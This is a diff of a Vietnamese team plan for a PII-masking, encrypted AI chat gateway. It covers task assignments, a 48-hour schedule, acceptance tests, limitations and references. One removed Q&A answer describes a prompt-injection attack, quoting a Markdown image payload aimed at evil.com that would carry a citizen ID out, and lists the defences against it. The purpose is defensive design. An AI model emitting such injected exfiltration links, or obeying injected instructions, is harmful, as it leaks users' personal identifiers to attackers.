-   - *Đáp:* (1) Các tác vụ thẩm định tín dụng/hợp đồng phức tạp vẫn cần trí tuệ của Frontier LLM (Gemini Pro/GPT-4o) mà cụm GPU nội bộ vừa đắt đỏ hàng trăm nghìn USD vừa không theo kịp; (2) **Local LLM không giải quyết được Insider Threat**: lịch sử chat lưu trong DB nội bộ vẫn là bản rõ cho DBA/Sysadmin đọc trộm — Trụ cột 1 & 2 của chúng tôi mã hóa chính lớp lịch sử này; (3) Gateway của chúng tôi hỗ trợ định tuyến lai (Hybrid) cả Cloud AI lẫn Local AI.
-2. **"ChatGPT Enterprise và Vertex AI đã cam kết không dùng dữ liệu để train (Zero Data Retention). Nhóm có đang giải quyết bài toán thừa không?"**
-   - *Đáp:* Cam kết hợp đồng (Policy Trust) không thay thế được bảo đảm mật mã và nghĩa vụ pháp lý. Theo **Điều 20 & Khoản 1 Điều 30 Luật BVDLCN 91/2025/QH15**, việc truyền định danh nhạy cảm (CCCD, STK, bệnh án) dạng bản rõ ra nền tảng nước ngoài đã kích hoạt rủi ro chuyển dữ liệu xuyên biên giới và vi phạm nguyên tắc giới hạn dữ liệu trong phạm vi cần thiết. Hơn nữa, khi bật ZDR trên Cloud, doanh nghiệp phải tự lưu lịch sử ở DB của mình và lập tức đối mặt với rủi ro lộ DB / Admin nội bộ.
-3. **"Mã hóa trên Web App thì nếu chính server phát hành file JavaScript độc hại để ăn cắp bản rõ trước khi mã hóa thì sao?"**
-   - *Đáp:* Chúng tôi nêu thẳng giới hạn cố hữu này của mọi ứng dụng Web E2EE (như ProtonMail Web, Bitwarden Web) trong Threat Model và khóa bằng 3 lớp: (1) **CSP nghiêm ngặt** (`connect-src` chỉ cho phép kết nối tới TideCloak và Gateway, chặn mọi đường gửi dữ liệu ra ngoài); (2) **SRI & Public Build Hash**; và (3) Lộ trình v2 đóng gói thành **Browser Extension ghim phiên bản có chữ ký số** tách biệt khỏi web server.
-4. **"Nếu câu chat ghi *'Tôi là Tổng giám đốc hãng xe điện lớn nhất Việt Nam, cần cơ cấu khoản nợ 5.000 tỷ'*, che tên thành `[NAME_1]` thì AI vẫn biết là ai?"**
-   - *Đáp:* Đó là bài toán *Quasi-identifier Re-identification*. Chúng tôi xử lý bằng: (1) **Strict Mode** khái quát hóa cả tên tổ chức (`[ORG_1]`), địa điểm, và làm tròn bậc số tiền; (2) **Thanh cảnh báo rủi ro (`riskScore`) + Click-to-Mask** để người dùng bôi đen thêm chức danh đặc thù trước khi gửi; (3) Đo lường trực tiếp *Re-identification Rate* trong bảng Metrics.
-5. **"Tiếng Việt không dấu ('anh nguyen van an'), số tài khoản 8–14 số nhìn giống hệt số tiền hay mã đơn hàng. Làm sao bắt chính xác trên trình duyệt mà không cần server Python?"**
-   - *Đáp:* Chúng tôi thiết kế bộ lọc 3 tầng bằng TypeScript thuần: (1) Kiểm tra cấu trúc toán học (63 mã tỉnh CCCD `001–096`, đầu số nhà mạng VN, cấu trúc MST); (2) **Context-Window Scoring (±55 ký tự)** chỉ gắn nhãn `[STK]` khi có từ khóa ngân hàng/giao dịch xung quanh và loại trừ đơn vị tiền tệ; (3) **Heuristic 60 Họ Việt Nam + Tên đệm + Danh xưng** trên cả văn bản có dấu và chuẩn hóa bỏ dấu, kết hợp lan truyền bí danh trong phiên (`Session Alias Propagation`).
-6. **"Khi thay bằng `[NAME_1]`, câu trả lời của LLM có bị ngô nghê đi không? Nếu khi stream về LLM cắt đôi chữ `[NA` + `ME_1]` hoặc viết lệch thành `[Name 1]` thì sao?"**
-   - *Đáp:* Token có kiểu ngữ nghĩa rõ ràng (`[NAME_1]`, `[STK_1]`) và giữ nguyên xuyên suốt cuộc hội thoại nên LLM vẫn suy luận chính xác trên cấu trúc logic (được chứng minh qua điểm LLM-as-Judge trên 50 bài test). Khi stream về, bộ **`StreamingFuzzyUnmasker`** dùng kỹ thuật *Accumulated Prefix* giữ lại phần đuôi đang mở dở ngoặc `[` và quét 1 lượt (Single-Pass) bắt cả các biến thể fuzzy như `[Name 1]`, `(NAME_1)`.
-7. **"Lỡ ở lượt chat thứ 2, trình duyệt gửi lịch sử cuộc trò chuyện lên LLM mà lấy nhầm nội dung đã ghép tên thật trên màn hình thì lộ hết PII?"**
-   - *Đáp:* Chúng tôi ngăn chặn triệt để lỗi kinh điển này bằng kiến trúc **Dual-Track History**: cấu trúc dữ liệu lưu tách biệt `plaintext` (chỉ để render ở Cột 1) và `maskedText` (chỉ để gửi lên AI Gateway ở các lượt tiếp theo). Hàm gọi Gateway bị khóa cứng về kiểu (type-safe) chỉ nhận `maskedText`.
-8. **"Nếu văn bản dán vào bị gài Prompt Injection, lừa AI trả về thẻ ảnh Markdown `![img](https://evil.com/?cccd=[CCCD_1])`, rồi trình duyệt tự ghép số CCCD thật vào URL và tải ảnh thì sao?"**
-   - *Đáp:* Chặn ở 3 chốt: (1) Bộ Unmasker cấm thay thế token nằm bên trong thuộc tính URL (`href`, `src`, `http://`, `https://`); (2) Bộ render Markdown khóa hoàn toàn thẻ `<img>` và biến link ngoài thành văn bản cảnh báo; (3) CSP `img-src 'self' data:` chặn trình duyệt gửi request tải ảnh ra ngoài.
-9. **"Tại sao phải dùng TideCloak mà không dùng AWS KMS hay HashiCorp Vault?"**
-   - *Đáp:* Với AWS KMS hay Vault, khóa nằm ở phía Server và Root Admin / Cloud Admin có thể tự cấp quyền `kms:Decrypt` để âm thầm giải mã toàn bộ DB. TideCloak mang lại 2 thứ KMS truyền thống không có: (1) Khóa bảo vệ bằng mật mã ngưỡng trên mạng ORK và chỉ giải mã thẳng về trình duyệt người dùng (server hoàn toàn mù); (2) **Quorum-Enforced Governance (QEA)** bắt buộc mọi thay đổi quyền Admin phải có chữ ký của hội đồng Admin độc lập.
-10. **"Nếu mạng TideCloak bị đứt kết nối hoặc nhân viên nghỉ việc mất tài khoản thì doanh nghiệp có mất trắng dữ liệu không?"**
-    - *Đáp:* (1) Nhờ **Envelope Encryption**, trình duyệt chỉ gọi Tide 1 lần duy nhất khi mở hội thoại để lấy `K_conv` vào RAM, mọi tin nhắn sau đó chạy offline 100% bằng WebCrypto (`< 2ms`), và tính năng che PII + chat AI vẫn hoạt động ngay cả khi Tide offline; (2) Với khách hàng doanh nghiệp, khi tạo `K_conv`, trình duyệt hỗ trợ tạo thêm một bản bọc dự phòng (*Enterprise Break-Glass Escrow*) bằng khóa công khai của Hội đồng Bảo mật công ty (khóa giải mã được chia mảnh Shamir 3-of-5 cất giữ ngoại tuyến).
+Tổng: khoảng 12–17 giờ. Reviewer: Khánh. Nếu A1/A2 kẹt, báo ngay để nhóm tiếp tục mock; không dồn sang tự viết hệ quản lý khóa mới.
+
+### B — Lê Gia Khánh: Crypto client, storage API và AI Gateway
+
+Đây là phần có phụ thuộc chéo nhiều nhất; chốt interface sớm và chỉ hỗ trợ UI sau khi đường lưu/mở đã chạy.
+
+| ID | Task | Khó | Giờ | Phụ thuộc | Tiêu chí hoàn thành |
+|---|---|---|---|---|---|
+| B1 | Envelope crypto phía client: HKDF, AES-GCM, AAD | Khó | 3–4 | Interface A2; mock cho dev | Round-trip đúng; sửa byte/tráo conv/owner bị từ chối; IV mới mỗi lần ghi |
+| B2 | Schema snapshot và CRUD API có owner check/CAS | Vừa | 3–4 | Contract chốt H1; A4 hỗ trợ | F5 mở đúng dữ liệu; hai tab ghi xung đột nhận 409; retry không tạo bản trùng |
+| B3 | Gateway một provider, JSON response, timeout, quota, không content log | Vừa | 2–3 | API key hoạt động | Chat một lượt được; role/context/output bị giới hạn; lỗi không lộ prompt |
+| B4 | Nối A2 + B1 + B2 thành save/load hoàn chỉnh | Khó | 2–3 | A2, B1, B2 | Dữ liệu trong DB mã hóa; A mở lại được; lỗi unwrap không fallback bản rõ |
+| B5 | Kiểm tra lỗi provider, cấu hình chạy và reset demo | Vừa | 2–3 | B3, D3 | Dự án chạy theo README, không commit secret; reset chỉ tác động DB demo |
+
+Tổng: khoảng 12–17 giờ. Reviewer: Khoa cho crypto/auth, Kin cho lỗi dữ liệu. B1 là code client dù B sở hữu cả backend; không chuyển plaintext hoặc crypto key sang backend vì thuận tiện.
+
+### C — Cái Hoàng Bảo Kin: PII, kiểm thử và số liệu
+
+Phù hợp vai trò QA có khả năng TypeScript mức vừa. Khánh hỗ trợ chuẩn hóa interface; không yêu cầu C xây model NLP trong 48 giờ.
+
+| ID | Task | Khó | Giờ | Phụ thuộc | Tiêu chí hoàn thành |
+|---|---|---|---|---|---|
+| C1 | Chuẩn bị 100 câu tổng hợp có nhãn, tách 60 dev/40 holdout | Vừa | 2–3 | Persona và 5 nhóm PII | Có câu có/không dấu, nhập nhằng, câu không PII; không dùng dữ liệu khách hàng thật |
+| C2 | Regex/context cho 4 loại số/email và từ điển tên thủ công | Vừa | 3–4 | C1 dev set | Unit test ca biên; không dùng ASCII word boundary như giải pháp tiếng Việt tổng quát |
+| C3 | Token map ổn định và khôi phục exact-match | Vừa | 2–3 | Contract D1 | Không thay nhầm tên; literal giống token và token không biết có hành vi xác định |
+| C4 | Test nhiều lượt, canary outbound và rò rỉ qua log/DB | Vừa | 3–4 | B3, B4, D3 | Kiểm tra request turn 2/3; bản hiển thị khôi phục không đi vào Gateway |
+| C5 | Báo cáo holdout, utility và checklist nghiệm thu | Vừa | 2–3 | C2, C3, luồng chat | Báo số liệu đo được và lỗi còn lại; phân biệt auto-mask với người dùng sửa preview |
+
+Tổng: khoảng 12–17 giờ. Reviewer: Khoa cho kiểm thử bảo mật, Hiếu cho preview/khôi phục. Không chỉnh quy tắc dựa trên holdout rồi vẫn báo đó là kết quả test độc lập.
+
+### D — Trần Trung Hiếu: UI, tích hợp trải nghiệm và trình diễn
+
+Phù hợp vai trò giao diện/demo; bắt đầu bằng component đơn giản, không phụ trách crypto. Nếu ít kinh nghiệm React, Khánh hỗ trợ skeleton và phần state tích hợp; cắt trang trí để giữ thời gian.
+
+| ID | Task | Khó | Giờ | Phụ thuộc | Tiêu chí hoàn thành |
+|---|---|---|---|---|---|
+| D1 | Chat UI text thuần, preview trước gửi và giao diện hội thoại | Vừa | 3–4 | Contract H1, fixture mock | Dán hồ sơ, thấy phần đã che, sửa lựa chọn và gửi được trên mock |
+| D2 | Thao tác chọn văn bản/từ điển tên; nối PII service | Vừa | 2–3 | C2, C3 | Có thể bổ sung tên bị bỏ sót; preview khớp request thực tế |
+| D3 | Tích hợp login, request đã che, save/load và lỗi | Khó | 3–4 | A2, B3, B4 | Chat ba lượt, reload đúng, không dựng request từ DOM; pending/409/error rõ ràng |
+| D4 | Panel request đã che và bằng chứng DB demo | Dễ | 1–2 | D3, B5 | Hai view không tạo server log chứa nội dung; không cần dashboard riêng |
+| D5 | README sử dụng, slide và video demo | Dễ/Vừa | 3–4 | Luồng Must, C5, A3 | Tài liệu đúng giới hạn; video và thời lượng theo yêu cầu chính thức |
+
+Tổng: khoảng 12–17 giờ. Reviewer: Kin cho QA, Khánh cho tích hợp. Video backup và README được ưu tiên trước animation, mobile polish hoặc dashboard ba cột hoàn chỉnh.
+
+## 8. Lộ trình 48 giờ và thứ tự phối hợp
+
+Các mốc là thời gian lịch. Chia ca để mỗi người có thời gian nghỉ; dành phần còn lại cho đồng bộ, chờ dịch vụ và sửa lỗi, không phân công 48 giờ làm việc liên tục.
+
+| Mốc | Mục tiêu chung | Ai làm gì / điều kiện ra cổng |
+|---|---|---|
+| H0–H1 | Chốt phạm vi và hợp đồng module/API | Khoa chốt Tide adapter; Khánh tạo schema/types; Kin chuẩn bị fixture; Hiếu dựng skeleton |
+| H1–H6 | Xác minh rủi ro lớn nhất | A1/A2/A3 spike; B1/B2 bằng mock; C1/C2; D1. H6 công bố trạng thái Tide thật |
+| H6–H16 | Có một luồng thật xuyên suốt | Đăng nhập → preview → model → mã hóa snapshot → lưu → reload. Cắt Should nếu chưa đạt |
+| H16–H28 | Củng cố và hoàn thiện Must | Chat ba lượt, test A/B, QEA, CRUD authorization, CAS và lỗi provider; sửa ca lỗi trước thêm UI |
+| H28–H36 | Đo kiểm và chuẩn bị trình diễn | Holdout, canary, kiểm tra payload/log/DB, đo độ trễ; quay video đầu tiên ngay khi luồng ổn |
+| H36–H42 | Feature freeze | Chỉ sửa lỗi chặn demo; hoàn thiện README/slide, kiểm tra chạy trên máy thứ hai |
+| H42–H48 | Diễn tập và nộp | Xác minh yêu cầu BTC, quay lại nếu cần, dự phòng mạng và xác nhận hồ sơ nộp |
+
+**Điểm chặn quan trọng:** A2 → B4 → D3. Giảm thời gian chờ bằng interface mock đã thống nhất, không cho phép mock trộn với bản chạy thật mà không có nhãn. D1 và C1/C2 chạy độc lập với Tide.
+
+Nếu H16 chưa có luồng xuyên suốt: bỏ panel mở rộng, chia sẻ hội thoại, đo nhiều tác vụ và mọi Should; tập trung một prompt, một response, save/reload, kiểm thử A/B và QEA. Nếu thời gian thực tế ngắn hơn 48 giờ, chốt lại phạm vi theo cổng này thay vì ép toàn bộ lịch trình.
+
+## 9. Tiêu chí nghiệm thu và số liệu báo cáo
+
+### 9.1. Must-pass trước demo có tuyên bố bảo mật
+
+- [ ] Tích hợp Tide thật có bằng chứng A mở/B bị từ chối; mock không thể bật ngầm.
+- [ ] QEA thật: ghi trạng thái trước yêu cầu, pending khi chưa đủ quorum và kết quả sau duyệt/từ chối. Chỉ tuyên bố cho thao tác đã kiểm thử.
+- [ ] CRUD không cho user khác đọc/sửa/xóa; JWT sai hoặc hết hạn bị từ chối.
+- [ ] Sửa ciphertext/tráo sang conv khác bị xác thực thất bại; không hứa phát hiện rollback đồng bộ toàn DB.
+- [ ] Snapshot lưu lại mở đúng sau F5; xung đột hai tab không gây ghi đè âm thầm.
+- [ ] Request chat lượt 2/3 chỉ dùng bản đã che; không gửi khóa, PII map hoặc bản hiển thị khôi phục.
+- [ ] Không có canary nguyên bản ở payload provider, log và DB dump trong các ca test đã che canary. Ghi rõ cách kiểm tra và phạm vi, không coi grep là chứng minh không rò rỉ mọi dạng.
+- [ ] Output được render text thuần, không sinh request ảnh/link; lỗi provider và token không khớp không làm app mất lịch sử.
+- [ ] Logout dọn state/khóa của app; trên thiết bị kiểm thử không tìm thấy khóa thô trong storage ứng dụng.
+- [ ] Máy thành viên thứ hai chạy được theo README; chỉ dùng dữ liệu tổng hợp trong demo/video.
+
+### 9.2. Chỉ số vừa sức
+
+| Nhóm | Đo thế nào | Cách trình bày |
+|---|---|---|
+| PII | Precision/recall theo từng loại trên 40 câu holdout; ghi số entity và ca bỏ sót | Tách automatic detection, tên từ điển và sửa thủ công; không tuyên bố 0% ngoài bộ test |
+| Leakage | Số câu còn định danh trực tiếp trước/sau preview theo protocol cố định | Nếu người dựng hệ thống tự sửa preview, ghi rõ đây là assisted result |
+| Utility | 10 tác vụ tổng hợp: giữ đúng dữ kiện, không nhập nhầm người, checklist giấy tờ hợp lý | Kin chấm theo rubric; không cần LLM-as-Judge trong MVP |
+| Độ trễ | Thời gian mask, encrypt, unwrap và toàn bộ request; ít nhất 30 lần nếu đủ thời gian | Báo input/device/network, p50/p95 và số mẫu; chưa đo thì ghi chưa đo |
+| Tính sẵn sàng | Tide/LLM mất kết nối, timeout, reload và retry | Ghi hành vi thực tế và giới hạn; không gọi chat cloud là chạy offline |
+
+Không đặt số `<8 ms`, `200–400 ms`, “100% bảo vệ” hoặc “không bao giờ rò rỉ” làm kết quả mặc định. Mục tiêu tối ưu chỉ được chốt sau baseline.
+
+## 10. Nếu có 7–10 ngày
+
+| Giai đoạn | Mở rộng có giá trị | Chủ trì |
+|---|---|---|
+| Ngày 1–2 | Hoàn thành luồng Must và kiểm thử Tide/QEA | Khoa + Khánh; Kin/Hiếu nối PII/UI |
+| Ngày 3–4 | Sửa lỗi tích hợp, mở rộng corpus lên 300 câu với dev/test riêng; utility 30 tác vụ | Kin; Khánh xử lý lỗi dữ liệu |
+| Ngày 5–6 | Tối ưu context, latency, UX lỗi và key lifecycle; thêm streaming exact-token nếu thực sự cần | Khánh + Hiếu; Khoa review key/auth |
+| Ngày 7 | Feature freeze, kiểm tra máy thứ hai, threat model và video backup | Cả nhóm |
+| Ngày 8–10 | Diễn tập, hoàn thiện tài liệu; chỉ sửa lỗi được phát hiện | Hiếu điều phối demo, Khánh chốt phiên bản |
+
+Rollback witness, per-conversation key destruction, TEE, recovery/escrow và ẩn danh mạng vẫn là nghiên cứu tiếp theo; không tự động đưa vào sprint chỉ vì có thêm vài ngày.
+
+## 11. Demo, giới hạn và nguồn tham khảo
+
+Demo ngắn: dán hồ sơ tổng hợp → chọn PII và xem request đã che → nhận câu trả lời với tên được khôi phục tại client → reload lịch sử từ bản mã → thử mở bằng user B/sửa ciphertext → cho thấy một thay đổi quản trị đang chờ QEA. Chọn số bước phù hợp thời lượng BTC, dùng video dự phòng cho phần dài; kiểm tra lại yêu cầu video trước khi xuất, không mặc định 3 phút.
+
+Giới hạn phải có trong README/slide:
+
+- Provider/Gateway vẫn thấy nội dung đã giả danh hóa; quy tắc PII có thể bỏ sót và ngữ cảnh có thể tái định danh.
+- Kẻ kiểm soát code frontend có thể chèn code lấy dữ liệu trước mã hóa. CSP/SRI hỗ trợ chống một số kiểu tấn công nhưng không ngăn được chính bên phát hành sửa HTML/chính sách và gửi plaintext tới endpoint được phép. Bản web MVP tin cậy build client đang chạy.
+- Mất quyền/mất kết nối Tide có thể khiến không mở được hội thoại mới. Khóa đã unwrap trong RAM không tự biến mất khi IAM thu hồi quyền; người đã đọc được bản rõ có thể giữ bản sao.
+- Backup, metadata, full rollback, thiết bị bị chiếm quyền và bảo mật toàn bộ nội dung khi inference trên cloud không được giải quyết đầy đủ bởi MVP.
+- Không coi bảng log ứng dụng là immutable hoặc chữ ký giả là bằng chứng mật mã. Không so sánh đối thủ bằng khẳng định chưa có nguồn.
+
+Nguồn để kiểm tra khi triển khai:
+
+1. [Tide E2EE setup](https://docs.tide.org/Admin/e2ee): điều kiện realm/license/QEA, SDK encrypt/decrypt và role. Cần kiểm thử scope A/B trên phiên bản đang dùng.
+2. [Tide QEA setup](https://docs.tide.org/Admin/SetupIGA): đối chiếu luồng Change Request, ngưỡng quorum và thao tác được quản trị với cấu hình thực tế; realm chỉ có một admin chưa chứng minh phê duyệt nhiều bên.
+3. [Gemini Developer API: Zero data retention](https://ai.google.dev/gemini-api/docs/zdr): “không dùng để huấn luyện” không đồng nghĩa “không lưu dữ liệu”. Gemini Developer API và Vertex AI phải được đánh giá theo dịch vụ/cấu hình cụ thể.
+4. [Luật 91/2025/QH15](https://vanban.chinhphu.vn/?classid=1&docid=214590&pageid=27160&typegroup=) và [Nghị định 356/2025/NĐ-CP](https://vanban.chinhphu.vn/?classid=0&docid=216387&pageid=27160): căn cứ hiện hành cần rà soát khi trình bày pháp lý. Nghị định 13/2023 đã hết hiệu lực từ 01/01/2026; chỉ nhắc khi giải thích lịch sử/chuyển tiếp. Không tuyên bố ứng dụng tự động tuân thủ pháp luật hoặc che PII sẽ miễn nghĩa vụ chuyển dữ liệu xuyên biên giới.
+
+**Điều kiện hoàn thành bản kế hoạch:** mỗi thành viên nhận task Must, nhóm chốt hạn nộp thực tế và xác nhận bằng spike rằng Tide, user isolation và QEA chạy được trên môi trường dự định demo.
